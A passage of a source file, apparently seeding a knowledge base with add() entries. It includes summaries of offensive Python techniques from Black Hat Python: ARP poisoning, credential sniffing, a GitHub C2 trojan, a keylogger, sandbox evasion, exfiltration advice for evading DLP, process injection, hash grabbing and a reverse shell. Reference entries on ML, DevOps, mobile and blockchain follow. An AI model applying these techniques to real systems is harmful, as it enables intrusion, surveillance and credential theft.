    'Raw socket packet sniffing in Python (Black Hat Python Ch.3): Capture live network traffic using raw sockets. Linux: socket.socket(AF_INET, SOCK_RAW, IPPROTO_ICMP). Windows: socket.socket(AF_INET, SOCK_RAW, IPPROTO_IP); setsockopt(IPPROTO_IP, IP_HDRINCL, 1); ioctl(SIO_RCVALL). IP header decoding with ctypes Structure: version, ihl, tos, total_length, identification, flags/fragment_offset, ttl, protocol, checksum, src_address, dst_address. ICMP header decode: type, code, checksum, id, sequence. Use struct.unpack or ctypes.Structure with _fields_ for binary parsing. Platform differences: Windows needs promiscuous mode via SIO_RCVALL.', 1.0)

  add('network_security_python', ['python subnet host scanner', 'host discovery python', 'python port scanner raw socket'],
    'Network/host scanner in Python (Black Hat Python Ch.3): Discovers live hosts on a subnet using ICMP. Send UDP datagrams to all hosts in subnet → listen for ICMP "port unreachable" responses. Uses ipaddress module: for host in ipaddress.ip_network(subnet): threading per host for speed. Implementation: 1) Create raw socket for ICMP listening, 2) Spawn thread per target sending UDP to high port, 3) Parse incoming ICMP packets to identify responding hosts. Port scanning: connect_ex() returns 0 if port open, else error code. Threaded scanning with queue: producer adds ports, workers try connections. Combine with banner grabbing: recv() after connect for service identification.', 0.95)

  add('network_security_python', ['python scapy packet crafting', 'scapy arp spoofing', 'python arp poisoning attack'],
    'Scapy/Kamene packet crafting (Black Hat Python Ch.4): Scapy (or kamene fork) enables custom packet construction and network attacks. ARP spoofing: craft ARP reply packets (op=2) with attacker MAC to poison victim ARP cache, enabling MITM. Implementation: send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)). Must maintain poisoning with loop, restore original ARP on exit. Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward. Packet sniffing with scapy: sniff(filter="tcp port 110", prn=callback, store=0). Mail credential sniffing: filter for POP3/SMTP/IMAP, extract USER/PASS from payload. Image carving from HTTP traffic with face detection using OpenCV.', 1.0)

  add('network_security_python', ['python web application mapper', 'web directory enumeration python', 'web content discovery brute force python'],
    'Web application testing with Python (Black Hat Python Ch.5): Web app mapper — enumerate files/directories using wordlists against target URL. Implementation: thread pool sending HEAD/GET requests to target_url + word for each word in wordlist. Check response codes: 200=found, 301/302=redirect, 403=forbidden (still exists), 404=not found. Content brute-forcer: queue-based multithreaded directory/file enumeration using urllib/requests. Uses wordlists (e.g., all.txt with common paths). Authentication brute-force (e.g., Joomla): POST to login form with username/password combinations from wordlist, check response for success/failure indicators. Always handle rate limiting, cookies, CSRF tokens.', 0.95)

  add('network_security_python', ['python burp suite extension', 'burp proxy python plugin', 'web fuzzer python'],
    'Burp Suite extensions in Python (Black Hat Python Ch.6): Extend Burp Proxy using Jython (Python on JVM). BHP Bing: integrate search engine reconnaissance into Burp — find related hosts/subdomains. BHP Fuzzer: intercept HTTP requests and inject fuzzing payloads (SQL injection strings, XSS vectors, format strings) into parameters, headers, cookies. BHP Wordlist: generate custom wordlists from target site content — extract words from responses, build frequency-sorted list. Extension architecture: implement IBurpExtender interface, register callbacks for IHttpListener, IContextMenuFactory. processHttpMessage() for modifying requests/responses. Jython allows full Python stdlib in Burp.', 0.9)

  add('network_security_python', ['python git trojan command control', 'github command and control python', 'python c2 implant trojan'],
    'Git-based command and control (Black Hat Python Ch.7): Uses GitHub repository as covert C2 channel. Trojan checks repo for config files (JSON) listing modules to run. Architecture: trojan pulls config → imports specified modules (e.g., dirlister, environment) → executes → pushes results back to repo. Modules: dirlister.py lists directory contents, environment.py collects env vars. Advantages: encrypted (HTTPS), blends with normal git traffic, no custom protocol needed, easy module deployment. Implementation: github3 or PyGithub library for API access, base64 encode results, commit to data branch. Configurable task scheduling via JSON config.', 0.95)

  add('network_security_python', ['python keylogger', 'keyboard capture python', 'python screenshot capture tool'],
    'Windows offensive tools in Python (Black Hat Python Ch.8): Keylogger — captures all keystrokes using PyHook/pyWinhook library, hooks keyboard events via SetWindowsHookEx, logs to file or sends to remote server. Screenshot capture — uses pyautogui or ctypes to call Windows API (GetDesktopWindow, BitBlt) to capture screen contents. Shell executor — subprocess.Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) for remote command execution. All tools designed for post-exploitation scenarios after initial access is gained. Can be combined: keylogger + screenshotter + shell_exec as comprehensive monitoring suite.', 0.9)

  add('network_security_python', ['python sandbox detection', 'malware sandbox evasion python', 'virtual machine detection python'],
    'Sandbox detection in Python (Black Hat Python Ch.8): Techniques to detect if code runs in an analysis sandbox. Methods: 1) Check mouse movement — sandboxes often have no real user interaction, monitor GetCursorPos() over time. 2) Timing checks — sandboxes may accelerate sleep(), compare expected vs actual elapsed time. 3) Process list — look for analysis tools (wireshark, procmon, ollydbg, ida). 4) Registry keys — check for VM artifacts (VBoxGuest, VMware Tools). 5) Hardware checks — CPU count, RAM size (sandboxes often have minimal resources). 6) Username/hostname checks — default sandbox names. Combine multiple checks for reliability. If sandbox detected, exit or show benign behavior.', 0.9)

  add('network_security_python', ['python credential exfiltration', 'data exfiltration encryption python', 'python man in the browser'],
    'Exfiltration and credential theft (Black Hat Python Ch.9): Keygen — generate RSA/AES keys for encrypting exfiltrated data. Credential server — receive and store stolen credentials from compromised hosts. IE exfiltration — extract browser history, saved passwords, cache from Internet Explorer using COM objects (win32com). Man-in-the-Browser (MITB) — inject into browser process to intercept/modify web traffic, capture form submissions, banking credentials. Decryptor — decrypt collected data server-side. Data encryption with PyCryptodome: from Crypto.Cipher import AES; cipher = AES.new(key, AES.MODE_CBC, iv). Always encrypt exfiltrated data in transit to avoid detection by DLP systems.', 0.9)

  add('network_security_python', ['python process monitor windows', 'file system monitoring python', 'python wmi process tracking'],
    'Process and file monitoring in Python (Black Hat Python Ch.10): Process monitor — use WMI (Windows Management Instrumentation) via wmi Python module to track process creation/termination. Win32_Process events: Name, ProcessId, ParentProcessId, CommandLine, Owner. File monitor — ReadDirectoryChangesW via win32file to watch directories for file creation, modification, deletion, renaming. Use cases: identify privilege escalation opportunities (programs creating temp files with weak permissions), discover scheduled tasks running as SYSTEM, find writable service binaries. Combine: monitor process → detect temp file creation → analyze permissions → identify DLL hijacking or unquoted service path vulnerabilities.', 0.9)

  add('network_security_python', ['python code injection process', 'dll injection python ctypes', 'python process memory manipulation'],
    'Code injection in Python (Black Hat Python Ch.11): Inject code into running processes using Windows API via ctypes. Steps: 1) OpenProcess(PROCESS_ALL_ACCESS, pid) to get handle, 2) VirtualAllocEx() to allocate memory in target, 3) WriteProcessMemory() to write shellcode/DLL path, 4) CreateRemoteThread() to execute. DLL injection: write DLL path → CreateRemoteThread with LoadLibrary as start address. Code coverage: set hardware breakpoints via debug registers (Dr0-Dr3) to track execution flow. Hash grabbing: access SAM database or LSA secrets using ctypes calls to advapi32.dll. All require appropriate privileges (usually admin/SYSTEM).', 0.95)

  add('network_security_python', ['python struct binary protocol', 'ctypes binary parsing python', 'python binary protocol data parsing'],
    'Binary protocol handling in Python: struct module — pack/unpack binary data for network headers. Common formats: B=unsigned byte, H=unsigned short, I=unsigned int, s=char[]. ctypes.Structure — define C-like structs with _fields_ list for IP/ICMP/TCP header parsing. from_buffer_copy(raw_bytes) to parse received packets. ipaddress module — ipaddress.ip_address(packed_ip), ip_network("192.168.1.0/24"). socket.inet_ntoa() converts packed IP to string. Network byte order: ! prefix in struct format string. Combine with threading for concurrent network operations and select.select() for I/O multiplexing on multiple sockets.', 0.95)

  add('network_security_python', ['python threading concurrent sockets', 'python multithreaded socket programming', 'concurrent socket python'],
    'Concurrent networking in Python: threading.Thread(target=func, args=(,)).start() for parallel connections. Thread synchronization: threading.Lock() for shared data, queue.Queue for producer-consumer patterns. Port scanner example: producer adds ports to Queue, worker threads pop and try connections. select.select(readable, writable, exceptional, timeout) for I/O multiplexing without threads. Socket timeouts: socket.settimeout(seconds). Connection pooling for web requests: requests.Session() with max_retries. subprocess.Popen for launching system commands. Signal handling for clean shutdown: signal.signal(SIGINT, handler). Always join threads and close sockets in finally blocks.', 0.9)

  add('network_security_python', ['black hat python security overview', 'python pentest toolkit overview', 'python offensive security toolkit'],
    'Python network security testing overview (Black Hat Python): Complete offensive Python toolkit covering: 1) Network layer — raw sockets for sniffing/scanning, TCP/UDP clients/servers, proxy tools, 2) Transport security — SSH (paramiko) for encrypted C2 and tunneling, 3) Application layer — web directory brute-forcing, credential attacks, Burp Suite extensions, 4) Post-exploitation — keyloggers, screenshots, sandbox detection, process monitoring, 5) Exfiltration — encrypted data theft, browser credential extraction, covert C2 via GitHub, 6) System level — code injection, DLL injection, hash extraction. Key libraries: socket, struct, ctypes, paramiko, scapy/kamene, requests, threading, wmi. All examples use Python 3 with modern best practices.', 1.5)

  add('network_security_python', ['python reverse shell implementation', 'netcat replacement python', 'python bhnet netcat tool'],
    'Python netcat replacement (Black Hat Python Ch.2): bhnet.py — full-featured network tool. Features: connect mode (client), listen mode (server), command shell (-c flag spawns shell), file upload (-u flag), command execution (-e flag). Implementation: argparse for CLI, socket for networking, subprocess for command execution, threading for concurrent handling. Command shell: subprocess.Popen(["/bin/sh", "-i"] or ["cmd.exe"], stdin=PIPE, stdout=PIPE, stderr=PIPE). File upload: receive data in loop, write to file. Can replace netcat for: port scanning, file transfer, remote shell, banner grabbing. Handles both interactive and non-interactive modes.', 0.95)

  add('network_security_python', ['python email credential sniffer', 'plaintext credential capture python', 'python packet inspection credentials'],
    'Credential sniffing with Python (Black Hat Python Ch.4): Capture plaintext credentials from network traffic. Target protocols: POP3 (port 110) — look for USER/PASS commands, SMTP (port 25/587) — AUTH LOGIN (base64 encoded), IMAP (port 143) — LOGIN command, FTP (port 21) — USER/PASS. Implementation with scapy: sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback). In callback: check packet.haslayer(Raw), search payload for credential keywords. With raw sockets: capture TCP segments, reassemble stream, parse application-layer protocols. Defense: use TLS/SSL versions (POP3S, SMTPS, IMAPS, FTPS) to encrypt credentials in transit.', 0.9)

  add('network_security_python', ['python image carving pcap traffic', 'http image extraction python', 'python opencv face detection pcap'],
    'Image carving from network traffic (Black Hat Python Ch.4): Extract images from captured HTTP traffic and analyze with computer vision. Steps: 1) Capture HTTP responses with scapy/pcap, 2) Reassemble TCP streams, 3) Parse HTTP headers to find Content-Type: image/*, 4) Extract image data from response body, 5) Save to disk. Face detection with OpenCV: cv2.CascadeClassifier("haarcascade_frontalface_default.xml"); faces = cascade.detectMultiScale(gray_image, scaleFactor=1.3, minNeighbors=5). Draw rectangles around detected faces. Use case: monitoring network for sensitive image data leakage, identifying personnel from captured photos. Combine with ARP spoofing for MITM image interception.', 0.85)

  // ── Data Science & Machine Learning ──────────────────────────────────────────
  add('data_science_ml', ['supervised learning classification regression', 'machine learning model training', 'sklearn model fitting'],
    'Supervised learning fundamentals: Classification predicts discrete labels (spam/not-spam), regression predicts continuous values (house price). Key algorithms — Logistic Regression: linear decision boundary, sigmoid activation, good baseline. Decision Trees: recursive feature splitting, interpretable but prone to overfitting. Random Forest: ensemble of trees with bagging, reduces variance. SVM: finds maximum-margin hyperplane, kernel trick for non-linear boundaries. KNN: instance-based, classifies by majority vote of k nearest neighbors. Workflow: train_test_split → fit(X_train, y_train) → predict(X_test) → evaluate with accuracy/precision/recall/F1.', 0.95)

  add('data_science_ml', ['unsupervised learning clustering dimensionality reduction', 'kmeans dbscan clustering', 'pca tsne dimensionality reduction'],
    'Unsupervised learning: Discovers hidden patterns without labels. Clustering — K-Means: iterative centroid assignment, requires k, sensitive to initialization (use k-means++). DBSCAN: density-based, finds arbitrary-shaped clusters, handles noise/outliers. Hierarchical: agglomerative (bottom-up) or divisive (top-down), produces dendrogram. Dimensionality reduction — PCA: linear projection onto principal components, preserves max variance. t-SNE: non-linear, preserves local structure, great for visualization but slow. UMAP: faster than t-SNE, preserves global structure better. Use silhouette score and elbow method for cluster evaluation.', 0.9)

  add('data_science_ml', ['neural network deep learning pytorch tensorflow', 'deep learning architecture layers', 'backpropagation gradient descent'],
    'Deep learning fundamentals: Neural networks with multiple layers learn hierarchical representations. Architecture: Input → Hidden layers (Dense/Conv/Recurrent) → Output. Activation functions: ReLU (max(0,x), default hidden), Sigmoid (binary output), Softmax (multi-class). Training: forward pass → compute loss (CrossEntropy/MSE) → backpropagation → gradient descent (SGD/Adam/AdamW). Regularization: Dropout (randomly zero neurons), BatchNorm (normalize activations), L2 weight decay. Frameworks: PyTorch (dynamic graphs, research-friendly), TensorFlow/Keras (production, tf.keras API). GPU acceleration with CUDA. Common architectures: MLP, CNN, RNN/LSTM, Transformer.', 0.95)

  add('data_science_ml', ['convolutional neural network image recognition cnn', 'computer vision deep learning', 'image classification object detection'],
    'Convolutional Neural Networks (CNN): Specialized for spatial data (images). Layers: Conv2d (learnable filters extract features — edges, textures, objects), MaxPool2d (downsample, translation invariance), Flatten → Dense (classification). Architectures: LeNet (pioneer), AlexNet (deep CNN breakthrough), VGG (3x3 filters), ResNet (skip connections, 100+ layers), EfficientNet (compound scaling). Transfer learning: use pretrained ImageNet weights, fine-tune last layers. Tasks: classification (ResNet), object detection (YOLO, Faster R-CNN), segmentation (U-Net, Mask R-CNN). Data augmentation: random crop, flip, rotation, color jitter.', 0.9)

  add('data_science_ml', ['natural language processing nlp transformer bert', 'text classification sentiment analysis nlp', 'word embeddings language model'],
    'Natural Language Processing (NLP): Text processing with deep learning. Pipeline: tokenization → embedding → model → task head. Word embeddings: Word2Vec (CBOW/Skip-gram), GloVe (co-occurrence matrix), FastText (subword). Transformer architecture (Vaswani 2017): self-attention mechanism, positional encoding, multi-head attention, feed-forward layers. Pre-trained models: BERT (bidirectional, masked LM), GPT (autoregressive, text generation), T5 (text-to-text). Fine-tuning: add task-specific head, train on downstream data. Tasks: text classification, NER, question answering, summarization, translation. Libraries: HuggingFace Transformers, spaCy, NLTK.', 0.95)

  add('data_science_ml', ['pandas dataframe data manipulation', 'data preprocessing feature engineering', 'exploratory data analysis eda'],
    'Data preprocessing and EDA: Essential first steps. Pandas: pd.read_csv(), DataFrame operations — df.describe(), df.info(), df.isnull().sum(). Cleaning: handle missing values (fillna, dropna, imputation), remove duplicates, fix dtypes. Feature engineering: one-hot encoding (pd.get_dummies), label encoding, scaling (StandardScaler, MinMaxScaler), log transform for skewed data. EDA: distribution plots (histplot, boxplot), correlation matrix (df.corr(), heatmap), pairplot for feature relationships. Feature selection: correlation analysis, mutual information, recursive feature elimination. Train/test split: sklearn.model_selection.train_test_split with stratification.', 0.9)

  add('data_science_ml', ['gradient boosting xgboost lightgbm catboost', 'ensemble methods boosting bagging', 'kaggle competition winning model'],
    'Gradient Boosting: Sequential ensemble that corrects predecessor errors. XGBoost: regularized gradient boosting, handles missing values, parallel tree construction, dominant in Kaggle competitions. Hyperparameters: n_estimators, max_depth, learning_rate, subsample, colsample_bytree. LightGBM: leaf-wise growth (faster), histogram-based splitting, native categorical support. CatBoost: ordered boosting, automatic categorical encoding, GPU training. Tuning: GridSearchCV/RandomizedSearchCV/Optuna for hyperparameter optimization. Stacking: train meta-model on base model predictions. Feature importance: SHAP values for interpretable ML explanations.', 0.9)

  add('data_science_ml', ['reinforcement learning', 'q-learning', 'dqn', 'policy gradient', 'reward', 'openai gym', 'reinforcement'],
    'Reinforcement Learning: Agent learns optimal policy through environment interaction. Framework: state → action → reward → next state (MDP). Value-based: Q-Learning (tabular), DQN (neural network Q-function, experience replay, target network). Policy-based: REINFORCE (Monte Carlo policy gradient), PPO (proximal policy optimization, clipped objective). Actor-Critic: A2C/A3C (parallel environments), SAC (soft actor-critic, entropy regularization). Environments: OpenAI Gym/Gymnasium, MuJoCo (physics), Atari (games). Applications: game AI, robotics, recommendation systems, resource allocation. Challenges: sample efficiency, reward shaping, exploration-exploitation tradeoff.', 1.1)

  add('data_science_ml', ['time series forecasting arima lstm', 'sequential data prediction temporal', 'prophet seasonal decomposition'],
    'Time series forecasting: Predicting future values from temporal data. Classical: ARIMA (AutoRegressive Integrated Moving Average) — stationary series, (p,d,q) parameters. Seasonal: SARIMA adds seasonal components. Exponential smoothing: simple, double (Holt), triple (Holt-Winters). Modern: Prophet (Facebook, handles holidays/seasonality), LSTM networks (long-term dependencies), Temporal Fusion Transformers. Decomposition: trend + seasonality + residual (additive/multiplicative). Evaluation: RMSE, MAE, MAPE, walk-forward validation. Stationarity: ADF test, differencing. Feature engineering: lag features, rolling statistics, Fourier terms for seasonality.', 0.85)

  add('data_science_ml', ['generative adversarial network gan image generation', 'variational autoencoder vae latent space', 'diffusion model stable diffusion'],
    'Generative models: Create new data samples. GANs (Goodfellow 2014): Generator (noise→fake data) vs Discriminator (real/fake classifier), adversarial training. Variants: DCGAN (convolutional), StyleGAN (high-quality faces), CycleGAN (unpaired image translation), Pix2Pix (paired). VAE: encoder→latent space→decoder, KL divergence regularization, smooth latent space for interpolation. Diffusion models: progressive denoising, DDPM/DDIM, U-Net backbone. Stable Diffusion: text-to-image via CLIP text encoder + latent diffusion. Applications: image generation/editing, data augmentation, super-resolution, style transfer.', 0.85)

  // ── Cloud & DevOps ────────────────────────────────────────────────────────────
  add('cloud_devops', ['docker container image dockerfile', 'container orchestration containerization', 'docker compose multi-container'],
    'Docker containerization: Package applications with dependencies into portable containers. Dockerfile: FROM (base image), RUN (execute commands), COPY/ADD (files), EXPOSE (ports), CMD/ENTRYPOINT (startup command). Multi-stage builds: separate build and runtime stages, smaller images. Docker Compose: define multi-container apps in docker-compose.yml — services, networks, volumes. Key commands: docker build -t name ., docker run -p 8080:80, docker exec -it container bash. Best practices: minimal base images (alpine), .dockerignore, non-root user, layer caching optimization, health checks. Registries: Docker Hub, ECR, GCR, ACR.', 0.95)

  add('cloud_devops', ['kubernetes k8s pod deployment service', 'container orchestration kubernetes cluster', 'kubectl helm kubernetes management'],
    'Kubernetes (K8s): Container orchestration platform. Core objects: Pod (smallest unit, one+ containers), Deployment (declarative pod management, rolling updates), Service (stable networking — ClusterIP/NodePort/LoadBalancer), Ingress (HTTP routing). ConfigMap/Secret for configuration. PersistentVolume for storage. Namespaces for isolation. kubectl: apply -f manifest.yaml, get pods, describe pod, logs, exec. Helm: package manager, charts for templated deployments. Architecture: Control Plane (API server, etcd, scheduler, controller manager) + Worker Nodes (kubelet, kube-proxy, container runtime). HPA for autoscaling.', 0.95)

  add('cloud_devops', ['ci cd pipeline github actions jenkins', 'continuous integration deployment automation', 'automated testing deployment pipeline'],
    'CI/CD pipelines: Automate build, test, deploy. CI (Continuous Integration): auto-build + test on every commit. CD (Continuous Deployment): auto-deploy to production. GitHub Actions: workflow YAML in .github/workflows/, triggers (push/PR/schedule), jobs with steps, marketplace actions. Jenkins: Jenkinsfile (declarative/scripted pipeline), agents, plugins ecosystem. GitLab CI: .gitlab-ci.yml, stages, runners. Pipeline stages: lint → build → unit test → integration test → security scan → deploy staging → deploy production. Strategies: blue-green (two environments), canary (gradual rollout), rolling update.', 0.9)

  add('cloud_devops', ['terraform infrastructure as code iac', 'cloud provisioning terraform ansible', 'infrastructure automation configuration management'],
    'Infrastructure as Code (IaC): Manage infrastructure through declarative config files. Terraform: HCL language, provider-agnostic (AWS/Azure/GCP). Core workflow: terraform init → plan → apply → destroy. State management: terraform.tfstate, remote backends (S3, Terraform Cloud). Modules for reusable components. Ansible: agentless configuration management, YAML playbooks, SSH-based. Roles for organization. Pulumi: IaC with real programming languages (Python/TypeScript/Go). CloudFormation: AWS-native IaC. Best practices: version control, remote state with locking, separate environments, module reuse, secrets management with Vault.', 0.9)

  add('cloud_devops', ['aws cloud services ec2 s3 lambda', 'cloud computing amazon web services', 'serverless lambda api gateway dynamodb'],
    'AWS core services: Compute — EC2 (virtual machines, instance types), Lambda (serverless functions, event-driven, 15min timeout), ECS/EKS (container services), Fargate (serverless containers). Storage — S3 (object storage, buckets, versioning), EBS (block storage), EFS (file system). Database — RDS (managed SQL), DynamoDB (NoSQL, key-value), ElastiCache (Redis/Memcached), Aurora (high-performance). Networking — VPC (virtual network), ALB/NLB (load balancers), Route53 (DNS), CloudFront (CDN). Serverless pattern: API Gateway → Lambda → DynamoDB. IAM for access control. CloudWatch for monitoring.', 0.9)

  add('cloud_devops', ['monitoring observability prometheus grafana', 'logging alerting metrics tracing', 'application performance monitoring apm'],
    'Observability stack: Three pillars — Metrics, Logs, Traces. Metrics: Prometheus (pull-based, PromQL, time-series DB), Grafana (dashboards, alerting). Logs: ELK Stack (Elasticsearch + Logstash + Kibana), Fluentd/Fluent Bit (log collection), structured logging (JSON). Traces: Jaeger/Zipkin (distributed tracing), OpenTelemetry (unified observability SDK). APM: Datadog, New Relic, Dynatrace. Key metrics: RED (Rate, Errors, Duration for services), USE (Utilization, Saturation, Errors for resources). Alerting: Prometheus Alertmanager, PagerDuty integration. SLIs/SLOs/SLAs for reliability targets.', 0.85)

  add('cloud_devops', ['microservices architecture service mesh', 'distributed systems api gateway', 'event driven architecture message queue'],
    'Microservices architecture: Decompose monolith into independently deployable services. Communication: synchronous (REST/gRPC) or asynchronous (message queues — RabbitMQ, Kafka, SQS). API Gateway: single entry point, routing, authentication, rate limiting (Kong, AWS API Gateway). Service mesh: Istio/Linkerd — sidecar proxy (Envoy), mTLS, traffic management, observability. Patterns: Circuit Breaker (Hystrix), Saga (distributed transactions), CQRS (separate read/write), Event Sourcing. Service discovery: Consul, Kubernetes DNS. Challenges: distributed tracing, data consistency, network latency, operational complexity.', 0.9)

  add('cloud_devops', ['gitops argocd flux deployment', 'kubernetes gitops continuous delivery', 'declarative infrastructure git workflow'],
    'GitOps: Git as single source of truth for infrastructure and deployments. Principles: declarative desired state, versioned in Git, auto-applied, self-healing. ArgoCD: Kubernetes-native GitOps controller, watches Git repo, syncs cluster state, web UI, supports Helm/Kustomize/plain YAML. Flux: CNCF GitOps toolkit, GitRepository + Kustomization CRDs, image automation. Workflow: developer pushes manifest changes → Git repo updated → ArgoCD detects drift → auto-syncs cluster. Benefits: audit trail (Git history), rollback (git revert), consistent environments. Progressive delivery: Argo Rollouts for canary/blue-green with GitOps.', 0.85)

  // ── Mobile Development ────────────────────────────────────────────────────────
  add('mobile_development', ['react native mobile app cross platform', 'react native expo ios android', 'mobile app development react native javascript'],
    'React Native: Cross-platform mobile development with JavaScript/TypeScript. Architecture: JavaScript thread + Native thread, bridge communication (New Architecture: JSI + Turbo Modules + Fabric renderer). Expo: managed workflow, quick start, OTA updates, EAS Build. Core components: View, Text, ScrollView, FlatList, TouchableOpacity, TextInput, Image. Navigation: React Navigation (stack, tab, drawer). State: Redux/Zustand/React Query. Styling: StyleSheet.create(), Flexbox layout. Native modules: camera, geolocation, push notifications. Testing: Jest + React Native Testing Library. Deployment: App Store (TestFlight) + Google Play (internal testing).', 0.95)

  add('mobile_development', ['flutter dart mobile app cross platform', 'flutter widget material design', 'dart flutter ios android development'],
    'Flutter: Google cross-platform framework using Dart language. Architecture: everything is a Widget, three trees (Widget/Element/RenderObject), Skia rendering engine. Widget types: StatelessWidget (immutable), StatefulWidget (mutable state), InheritedWidget (dependency injection). Layout: Row, Column, Stack, Container, Expanded, Padding. Material Design widgets + Cupertino (iOS-style). State management: setState, Provider, Riverpod, BLoC pattern. Navigation: Navigator 2.0, GoRouter. Networking: http/dio packages. Storage: SharedPreferences, Hive, sqflite. Testing: widget tests, integration tests. Hot reload for rapid development.', 0.95)

  add('mobile_development', ['swift ios development uikit swiftui', 'ios app development xcode interface builder', 'apple ios native development swift'],
    'iOS Native Development with Swift: Apple ecosystem using Xcode IDE. UI frameworks: UIKit (imperative, mature) vs SwiftUI (declarative, modern). SwiftUI: @State, @Binding, @ObservedObject, @EnvironmentObject for state. Views: VStack/HStack/ZStack, List, NavigationView, TabView. UIKit: UIViewController lifecycle (viewDidLoad, viewWillAppear), Auto Layout constraints, UITableView/UICollectionView. Architecture: MVC (Apple default), MVVM (SwiftUI natural fit), VIPER. Data: Core Data (ORM), SwiftData (modern), Realm, UserDefaults. Networking: URLSession, Alamofire. Concurrency: async/await, actors. Distribution: App Store Connect, TestFlight.', 0.9)

  add('mobile_development', ['kotlin android development jetpack compose', 'android app native development kotlin', 'jetpack compose android material design'],
    'Android Native Development with Kotlin: Google preferred language for Android. Jetpack Compose: modern declarative UI toolkit. Composables: @Composable functions, remember/mutableStateOf for state, LaunchedEffect for side effects. Layout: Column, Row, Box, LazyColumn (recycler), Scaffold. Legacy: XML layouts + Activity/Fragment lifecycle. Architecture Components: ViewModel, LiveData/StateFlow, Room (SQLite ORM), Navigation Component. Dependency injection: Hilt/Dagger. Networking: Retrofit + OkHttp + Moshi/Gson. Image loading: Coil/Glide. Build system: Gradle with Kotlin DSL. Testing: JUnit, Espresso, Compose testing. Distribution: Google Play Console.', 0.9)

  add('mobile_development', ['mobile app state management redux zustand', 'cross platform mobile performance optimization', 'mobile push notifications local storage'],
    'Mobile app common patterns: State management — Redux (predictable, middleware), Zustand (lightweight), MobX (observable), Provider/Riverpod (Flutter). Performance: lazy loading, image caching, list virtualization (FlatList/LazyColumn), minimize re-renders, native driver animations. Push notifications: Firebase Cloud Messaging (FCM), Apple Push Notification Service (APNs), OneSignal. Local storage: AsyncStorage/MMKV (React Native), SharedPreferences/Hive (Flutter), UserDefaults/CoreData (iOS), DataStore/Room (Android). Authentication: Firebase Auth, OAuth2, biometric (Face ID/fingerprint). Analytics: Firebase Analytics, Amplitude, Mixpanel.', 0.85)

  add('mobile_development', ['mobile app testing automation appium', 'mobile ci cd fastlane distribution', 'mobile app deployment app store google play'],
    'Mobile testing and deployment: Testing pyramid — unit tests (Jest/JUnit), widget/component tests, integration tests (Detox/Espresso/XCUITest), E2E (Appium). Fastlane: automation for iOS/Android — gym (build), pilot (TestFlight upload), supply (Play Store upload), match (code signing). CI/CD: GitHub Actions + Fastlane, Bitrise, CircleCI. App Store: App Store Review Guidelines, metadata, screenshots, TestFlight beta. Google Play: internal/closed/open testing tracks, staged rollouts. Code Push/OTA: Expo Updates, CodePush (deprecated → EAS Update). Crash reporting: Crashlytics, Sentry. App size optimization: ProGuard/R8 (Android), bitcode (iOS).', 0.85)

  // ── Blockchain & Web3 ─────────────────────────────────────────────────────────
  add('blockchain_web3', ['solidity smart contract ethereum', 'ethereum solidity contract development', 'evm smart contract programming'],
    'Solidity smart contract development: Ethereum-native language for EVM. Contract structure: state variables, functions, modifiers, events, errors. Types: uint256, address, mapping, struct, enum, bytes. Visibility: public/private/internal/external. Key patterns: Ownable (access control), ReentrancyGuard (prevent re-entrancy attacks), Pausable, Upgradeable (proxy pattern). OpenZeppelin: battle-tested contract library — ERC20 (fungible token), ERC721 (NFT), ERC1155 (multi-token). Development: Hardhat (testing/deployment), Foundry (Solidity testing with forge), Remix IDE. Gas optimization: pack storage, use calldata, minimize SSTOREs, unchecked arithmetic.', 0.95)

  add('blockchain_web3', ['defi decentralized finance protocol', 'decentralized exchange amm liquidity pool', 'yield farming lending protocol defi'],
    'DeFi (Decentralized Finance): Financial services on blockchain without intermediaries. DEX: Uniswap (constant product AMM, x*y=k), Curve (stablecoin-optimized), SushiSwap. Lending: Aave (flash loans, variable/stable rates), Compound (cTokens, interest accrual). Yield aggregators: Yearn Finance (vault strategies). Stablecoins: USDC (fiat-backed), DAI (crypto-collateralized, MakerDAO). Key concepts: liquidity pools, impermanent loss, slippage, MEV (Maximal Extractable Value), flash loans (uncollateralized single-transaction loans). Risks: smart contract bugs, oracle manipulation, rug pulls, economic exploits.', 0.9)

  add('blockchain_web3', ['web3 dapp development ethers wagmi', 'blockchain frontend integration wallet', 'metamask wallet connection web3 react'],
    'Web3 DApp development: Frontend integration with blockchain. Libraries: ethers.js (provider, signer, contract interaction), viem (TypeScript-first, type-safe), wagmi (React hooks for Ethereum). Wallet connection: MetaMask, WalletConnect, Coinbase Wallet, Rainbow. Pattern: connect wallet → get signer → instantiate contract → call functions. Read (view/pure): free, no gas. Write (state-changing): requires transaction, gas fees, user confirmation. Events: contract.on(eventName, callback) for real-time updates. IPFS: decentralized storage for NFT metadata, Pinata/Infura pinning. Subgraphs: The Graph for indexed blockchain data querying with GraphQL.', 0.9)

  add('blockchain_web3', ['smart contract security audit vulnerability', 'solidity security reentrancy overflow', 'blockchain security exploit prevention'],
    'Smart contract security: Critical vulnerabilities and prevention. Reentrancy: external call before state update (DAO hack) — use checks-effects-interactions pattern, ReentrancyGuard. Integer overflow/underflow: use Solidity 0.8+ built-in checks or SafeMath. Access control: missing onlyOwner, improper role management. Front-running: MEV bots reorder transactions — use commit-reveal schemes. Oracle manipulation: flash loan attacks on price oracles — use Chainlink TWAP. Audit tools: Slither (static analysis), Mythril (symbolic execution), Echidna (fuzzing). Formal verification: Certora, K framework. Bug bounties: Immunefi platform.', 0.9)

  add('blockchain_web3', ['nft token standard erc721 erc1155', 'non-fungible token marketplace creation', 'nft smart contract minting metadata'],
    'NFT development: Non-fungible tokens on blockchain. Standards: ERC721 (unique tokens, ownerOf, transferFrom), ERC1155 (multi-token, batch operations, gas efficient). Metadata: on-chain (expensive) or off-chain (IPFS/Arweave + tokenURI). Minting patterns: public mint, allowlist (Merkle tree proof), lazy minting (sign off-chain, mint on purchase). Marketplace: royalty standard ERC2981, OpenSea/Blur integration. Generative art: on-chain SVG, Art Blocks pattern. Storage: IPFS CID for images/metadata, Arweave for permanent storage. Gas optimization: ERC721A (batch minting), merkle tree for allowlists.', 0.85)

  add('blockchain_web3', ['layer 2 scaling rollup zk optimistic', 'blockchain scalability sidechain bridge', 'polygon arbitrum optimism zksync scaling'],
